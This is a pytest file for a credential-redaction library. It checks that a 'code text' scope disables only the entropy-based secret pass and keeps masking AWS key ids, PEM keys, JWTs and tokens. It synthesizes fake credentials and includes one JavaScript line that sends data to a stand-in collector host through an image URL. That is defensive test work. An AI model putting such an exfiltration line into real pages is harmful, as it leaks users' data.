"""Over code, pass 3 stands down and every other pass runs (``redaction_switch.code_text``).

Pass 3 of ``redact_credentials`` reads a run of base64-alphabet characters as a bare
secret key by its entropy and shape. An alphabet an author indexes into passes every
gate, so a page whose script held one was served with ``[REDACTED: credential]`` in its
place and failed later with no error at load. The scope turns that one pass off for text
known to be code; the passes keyed on a fixed format must not notice.

Credential-shaped material is SYNTHESIZED at runtime, for the reason
``test_credential_redaction_switch.py`` gives: a diff carrying a working token string
reads as an exfiltration recipe to a review provider, while the scanner sees the same
bytes either way.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import random
import re
import string
from pathlib import Path

import pytest

from kiro_crew import security
from kiro_crew.platform.context import redact_code_via_context, redact_via_context
from kiro_crew.security import redaction, redaction_switch
from kiro_crew.testing.wait import await_until


def _digest(seed: str, length: int, *, upper: bool = False) -> str:
    out = hashlib.sha256(seed.encode()).hexdigest()
    return (out.upper() if upper else out)[:length]


#: 62 letters and digits, then the 18 punctuation marks of an 80-character palette.
_ALPHABET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "#$%&*+-=?@^_~:;<>!"


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _jwt() -> str:
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"sub": "kc-code-text", "iat": 1}).encode())
    return f"{header}.{payload}.{_digest('kc-jwt', 43)}"


def _pem() -> str:
    dashes = "-" * 5
    kind = "RSA PRIVATE KEY"
    body = _b64url(hashlib.sha256(b"kc-pem").digest() * 3)
    return f"{dashes}BEGIN {kind}{dashes}\n{body}\n{dashes}END {kind}{dashes}"


def _encoded_key_id() -> str:
    """A key id inside enough base64 to be one 40-character chunk, which pass 2 decodes."""
    key_id = "A" + "KIA" + _digest("kc-enc", 16, upper=True)
    return base64.b64encode(("pad " * 4 + key_id).encode()).decode()


#: One literal per pass that is keyed on a fixed format, each as a script would hold it.
_FIXED_FORMATS = {
    "key id": "var id = '" + "A" + "KIA" + _digest("kc-akia", 16, upper=True) + "';",
    "labelled secret": "var c = 'aws_secret_access_key=" + _digest("kc-label", 40) + "';",
    "pem block": "var k = `" + _pem() + "`;",
    "jwt": "var t = '" + _jwt() + "';",
    "prefixed token": "var t = '" + "gh" + "p_" + _digest("kc-ghp", 36) + "';",
    "token parameter": "fetch('/x?token=" + _digest("kc-param", 64) + "');",
    "token parameter holding an alphabet": "fetch('/x?token=" + _ALPHABET[:62] + "');",
    "encoded credential": "var e = '" + _encoded_key_id() + "';",
}


#: Every way a script may hold a 40-character key. The full pass masks the key in each, and the
#: scope must too: it leaves alone an alphabet and a data URI payload, and nothing else.
_KEY_SHAPES = (
    'password="{v}"',
    "api_key = '{v}'",
    "token={v}",
    '"client_secret": "{v}"',
    "AWS_SECRET_ACCESS_KEY={v}",
    "var password = '{v}';",
    "x-api-key: {v}",
    'const password =\n"{v}";',
    "const password =\n" + " " * 200 + '"{v}";',
    "localStorage.setItem('token', '{v}');",
    "headers['X-Api-Key'] = '{v}';",
    'auth: "Basic {v}"',
    "check(password, '{v}');",
    "Authorization: Token {v}",
    "var s = '{v}';",
    "const key = '{v}'",
    "x = '{v}'",
    "var a = [ '{v}' ];",
    "base64,{v}",
    "data:text/plain,{v}",
    "data:text/plain;base64,{v}",
)

#: Tables a program indexes into that the full pass rewrites, so each one breaks a page.
_ALPHABETS = {
    "the palette in the issue": _ALPHABET,
    "three copies": (string.ascii_lowercase + string.ascii_uppercase + string.digits) * 3,
}

#: Other orders programs write them in. The full pass leaves these alone, and so does the scope.
_ALPHABETS_LEFT_ALONE = {
    "base64 alphabet": string.ascii_uppercase + string.ascii_lowercase + string.digits + "+/=",
    "digits first": string.digits + string.ascii_lowercase + string.ascii_uppercase,
    "base58": "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",
}

#: Names a program gives such a table. Credential-sounding ones too: the shape decides.
_ALPHABET_NAMES = (
    "var ART_CHARS = '{p}';",
    "var keyStr = '{p}';",
    "const key = '{p}';",
    "var chars = '{p}';",
    "const alphabet = `{p}`;",
    "const password = '{p}';",
)

#: Data URI headers as pages write them.
_DATA_URI_HEADERS = (
    "data:image/png;base64,",
    "data:font/woff2;base64,",
    "data:image/svg+xml;charset=utf-8;base64,",
    "DATA:Image/PNG;BASE64,",
)


def _key(seed: str = "kc-labelled") -> str:
    """A 40-character key the full pass masks wherever it stands."""
    return base64.b64encode(hashlib.sha256(seed.encode()).digest()).decode()[:40]


def _blob() -> str:
    """Binary as a data URI carries it: long, and random enough that some window looks like a key."""
    return base64.b64encode(
        b"".join(hashlib.sha256(bytes([n])).digest() for n in range(12))
    ).decode()


class TestPassThreeStandsDown:
    def test_the_alphabet_is_a_bare_secret_outside_the_scope(self) -> None:
        """The control: without it the tests below could pass on text nothing flags."""
        literal = f"var ART_CHARS = '{_ALPHABET}';"
        out, warnings, matches = redaction.redact_credentials_with_records(literal)
        assert out != literal
        assert [m.rule for m in matches] == ["bare_aws_secret"]
        assert warnings == ["Redacted bare secret key (62 chars)"]

    def test_inside_the_scope_the_alphabet_is_served_as_written(self) -> None:
        literal = f"var ART_CHARS = '{_ALPHABET}';"
        with redaction_switch.code_text():
            out, warnings, matches = redaction.redact_credentials_with_records(literal)
        assert (out, warnings, matches) == (literal, [], [])

    def test_the_shim_serves_code_as_written_and_prose_still_masked(self) -> None:
        literal = f"var ART_CHARS = '{_ALPHABET}';"
        assert redact_code_via_context(literal) == literal
        assert redact_via_context(literal) != literal

    def test_a_base64_data_uri_is_served_as_written(self) -> None:
        blob = base64.b64encode(hashlib.sha256(b"kc-png").digest() * 12).decode()
        css = f".a {{ background: url(data:image/png;base64,{blob}) }}"
        assert redact_via_context(css) != css, "the control does not trip"
        assert redact_code_via_context(css) == css

    @pytest.mark.parametrize("name", sorted(_ALPHABETS))
    @pytest.mark.parametrize("template", _ALPHABET_NAMES)
    def test_an_ordered_alphabet_is_served_as_written_under_any_name(
        self, name: str, template: str
    ) -> None:
        code = template.format(p=_ALPHABETS[name])
        assert redact_via_context(code) != code, "the control does not trip"
        assert redact_code_via_context(code) == code

    @pytest.mark.parametrize("name", sorted(_ALPHABETS_LEFT_ALONE))
    def test_a_table_the_full_pass_leaves_alone_is_left_alone_by_the_scope(self, name: str) -> None:
        code = f"var T = '{_ALPHABETS_LEFT_ALONE[name]}';"
        assert redact_via_context(code) == code
        assert redact_code_via_context(code) == code

    @pytest.mark.parametrize("header", _DATA_URI_HEADERS)
    def test_a_data_uri_payload_is_served_as_written(self, header: str) -> None:
        code = f"var u = '{header}{_blob()}';"
        assert redact_via_context(code) != code, "the control does not trip"
        assert redact_code_via_context(code) == code

    @pytest.mark.parametrize("name", sorted(_FIXED_FORMATS))
    def test_every_fixed_format_is_still_masked_inside_the_scope(self, name: str) -> None:
        code = _FIXED_FORMATS[name]
        out = redact_code_via_context(code)
        assert out != code, f"{name} is served as written inside the scope"
        assert out == redact_via_context(code), f"{name}: the scope changed a pass it does not own"

    def test_a_url_carrying_data_out_is_still_replaced_inside_the_scope(self) -> None:
        blob = hashlib.sha256(b"kc-exfil").hexdigest() * 4
        code = f"new Image().src = 'https://collector.example.test/x?d={blob}';"
        assert redact_code_via_context(code) != code


class TestEverythingElseIsJudgedAsOutsideTheScope:
    """The scope leaves two shapes alone, so a page with neither is scrubbed as before."""

    @pytest.mark.parametrize("template", _KEY_SHAPES)
    def test_a_key_is_masked_in_every_shape_the_full_pass_masks_it(self, template: str) -> None:
        code = template.format(v=_key())
        assert _key() not in redact_via_context(code), "the control does not trip"
        assert redact_code_via_context(code) == redact_via_context(code)

    def test_a_key_glued_to_an_alphabet_is_judged_whole(self) -> None:
        """One run, so the full pass judges all of it, and so does the scope."""
        table = string.ascii_lowercase + string.ascii_uppercase + string.digits
        for run in (_key() + table, table + _key(), table[:20] + _key() + table[20:]):
            code = f"var x = '{run}';"
            assert _key() not in redact_via_context(code), "the control does not trip"
            assert redact_code_via_context(code) == redact_via_context(code)

    def test_a_key_beside_the_palette_is_masked_and_the_palette_is_kept(self) -> None:
        """Punctuation ends the palette's run, so the two are two runs and are judged apart."""
        code = f"var P = '{_ALPHABET}'; var k = '{_key()}';"
        assert _key() not in redact_via_context(code), "the control does not trip"
        out = redact_code_via_context(code)
        assert _ALPHABET in out
        assert _key() not in out

    def test_a_random_key_is_never_taken_for_an_alphabet(self) -> None:
        keys = [_key(f"kc-random-{n}") for n in range(2000)]
        assert not any(redaction._is_code_literal("", 0, key) for key in keys)

    def test_a_table_in_no_order_is_judged_like_a_key(self) -> None:
        """Stated limit, on the side that masks: a shuffled table is rewritten, as before."""
        letters = list(string.ascii_letters + string.digits)
        random.Random(7).shuffle(letters)
        code = f"var t = '{''.join(letters)}';"
        assert redact_via_context(code) != code, "the control does not trip"
        assert redact_code_via_context(code) == redact_via_context(code)

    @pytest.mark.parametrize("size", [40, 63])
    def test_a_short_payload_behind_a_data_uri_header_is_judged(self, size: int) -> None:
        code = f"var u = 'data:text/plain;base64,{(_key() + _blob())[:size]}';"
        assert redact_via_context(code) != code, "the control does not trip"
        assert redact_code_via_context(code) == redact_via_context(code)

    def test_a_run_behind_base64_without_a_data_uri_header_is_judged(self) -> None:
        code = f"var u = 'base64,{_blob()}';"
        assert redact_via_context(code) != code, "the control does not trip"
        assert redact_code_via_context(code) == redact_via_context(code)

    def test_the_stated_limit_a_long_payload_behind_a_data_uri_header_is_not_judged(self) -> None:
        """A key-shaped window inside a data URI payload of 64 characters or more is served."""
        code = f"var u = 'data:text/plain;base64,{_key()}{_blob()[:30]}';"
        assert _key() not in redact_via_context(code), "the control does not trip"
        assert _key() in redact_code_via_context(code)


class TestTheReadOfARunIsBounded:
    """The exemption reads a fixed amount, so no page can make it slow."""

    def test_a_run_past_the_alphabet_cap_is_not_read_at_all(self) -> None:
        class Counting(str):
            reads = 0

            def __getitem__(self, key):  # type: ignore[no-untyped-def]
                type(self).reads += 1
                return super().__getitem__(key)

        run = Counting("a" * (redaction._ALPHABET_RUN_MAX + 1))
        Counting.reads = 0
        assert not redaction._is_code_literal("", 0, run)
        assert Counting.reads == 0

    def test_a_run_that_is_no_alphabet_stops_at_its_first_window(self) -> None:
        class Counting(str):
            reads = 0

            def __getitem__(self, key):  # type: ignore[no-untyped-def]
                type(self).reads += 1
                return super().__getitem__(key)

        run = Counting(_blob() * 6)
        Counting.reads = 0
        assert not redaction._is_code_literal("", 0, run)
        assert Counting.reads <= 2 * redaction._SECRET_KEY_LEN, Counting.reads

    def test_the_data_uri_header_is_looked_for_only_just_before_the_run(self) -> None:
        far = "data:image/png;base64," + "x" * (redaction._DATA_URI_REACH + 10)
        run = _blob()
        assert not redaction._is_code_literal(far + run, len(far), run)
        assert redaction._is_code_literal("data:image/png;base64," + run, 22, run)


class TestTheScopeIsNarrow:
    def test_it_is_off_by_default_and_on_only_inside(self) -> None:
        assert redaction_switch.bare_secret_pass_enabled() is True
        with redaction_switch.code_text():
            assert redaction_switch.bare_secret_pass_enabled() is False
        assert redaction_switch.bare_secret_pass_enabled() is True

    def test_it_closes_when_the_enclosed_call_raises(self) -> None:
        with pytest.raises(RuntimeError):
            with redaction_switch.code_text():
                raise RuntimeError("boom")
        assert redaction_switch.bare_secret_pass_enabled() is True

    def test_it_nests(self) -> None:
        with redaction_switch.code_text():
            with redaction_switch.code_text():
                assert redaction_switch.bare_secret_pass_enabled() is False
            assert redaction_switch.bare_secret_pass_enabled() is False
        assert redaction_switch.bare_secret_pass_enabled() is True

    def test_the_owner_view_scope_is_a_different_thing(self) -> None:
        """Code text is not the owner's switch: the credential pass still runs in it."""
        key = "A" + "KIA" + _digest("kc-owner", 16, upper=True)
        with redaction_switch.code_text():
            assert redaction_switch.credential_pass_bypassed() is False
            assert security.redact_credentials(key)[0] != key

    @pytest.mark.asyncio
    async def test_a_task_outside_the_scope_still_has_every_pass(self) -> None:
        literal = f"var ART_CHARS = '{_ALPHABET}';"
        entered = asyncio.Event()
        release = asyncio.Event()

        async def code_task() -> str:
            with redaction_switch.code_text():
                entered.set()
                await release.wait()
                return security.redact_credentials(literal)[0]

        task = asyncio.create_task(code_task())
        try:
            await await_until(entered, what="the child to enter the code-text scope")
            assert redaction_switch.bare_secret_pass_enabled() is True
            assert security.redact_credentials(literal)[0] != literal
            release.set()
            assert await await_until(task, what="the child to finish") == literal
        finally:
            release.set()
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)


class TestOnlyTheNamedSeamOpensTheScope:
    def test_the_scope_is_opened_by_one_shim_and_the_shim_has_one_caller(self) -> None:
        """A grep-pinned allowlist: another code-text seam is a review decision."""
        pkg = Path(security.__file__).resolve().parents[1]  # src/kiro_crew
        opens = re.compile(r"\bwith\s+(?:\w+\.)*code_text\(\)|\bredact_code_via_context\b")
        files = {
            f.relative_to(pkg).as_posix()
            for f in pkg.rglob("*.py")
            if "/tests/" not in f.as_posix() and opens.search(f.read_text(encoding="utf-8"))
        }
        assert files == {
            "dashboard/handlers/member_dashboard.py",  # the page scrub, script and style text
            "platform/context.py",  # the shim
            "security/redaction_switch.py",  # the scope's docstring names the shim
        }, files

    def test_the_scan_that_grants_the_relaxation_has_one_user(self) -> None:
        """What the scan calls code gets the weaker rule, so a second user is a review decision.

        ``dashboard_frame.code_spans`` decides where the relaxation applies and
        ``map_page_text`` applies it. Both live in ``dashboard_frame.py``, and the page scrub is
        the only other file that may name them.
        """
        pkg = Path(security.__file__).resolve().parents[1]  # src/kiro_crew
        names = re.compile(r"\bmap_page_text\b|\bcode_spans\b")
        files = {
            f.relative_to(pkg).as_posix()
            for f in pkg.rglob("*.py")
            if "/tests/" not in f.as_posix() and names.search(f.read_text(encoding="utf-8"))
        }
        assert files == {
            "dashboard/handlers/member_dashboard.py",  # the page scrub
            "dashboard_frame.py",  # the scan and the mapping
        }, files
